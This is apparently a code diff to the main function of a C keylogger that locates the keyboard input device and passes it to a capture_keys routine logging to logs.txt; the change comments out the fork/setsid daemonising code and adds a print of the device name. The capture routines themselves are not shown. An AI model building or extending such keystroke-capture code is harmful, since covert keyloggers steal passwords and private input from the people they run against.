@@ -10,34 +10,31 @@
 
 int main()
 {
-	pid_t pid, sid;
+    FILE *file;
+    char *keyboard_event_filename = NULL;
 
-    pid = fork();
+    // pid_t pid, sid;
+    // pid = fork();
 
-    if (pid < 0) exit(EXIT_FAILURE);
-    
-    else if (pid > 0) 
-    {
-        printf("Child PID: %d\n", pid);
-        exit(EXIT_SUCCESS);
-    }
-    
-    umask(0);
+    // if (pid < 0)
+    //     exit(EXIT_FAILURE);
 
-	FILE *file = fopen("./logs.txt", "w");
+    // else if (pid > 0)
+    // {
+    //     printf("Child PID: %d\n", pid);
+    //     exit(EXIT_SUCCESS);
+    // }
 
-	sid = setsid();
+    // umask(0);
+    // sid = setsid();
 
-    char buffer[64];
+    file = fopen("./logs.txt", "w");
 
-    find_keyboard(buffer, file);
+    keyboard_event_filename = find_keyboard(keyboard_event_filename);
 
-    fprintf(file, "tchonga\n");
-    fflush(file);
-    fprintf(file, "%s\n",buffer);
-    fflush(file);
+    printf("%s", keyboard_event_filename);
 
-    capture_keys(file, buffer);
+    capture_keys(file, keyboard_event_filename);
 
-	return 0;
+    return 0;
 }
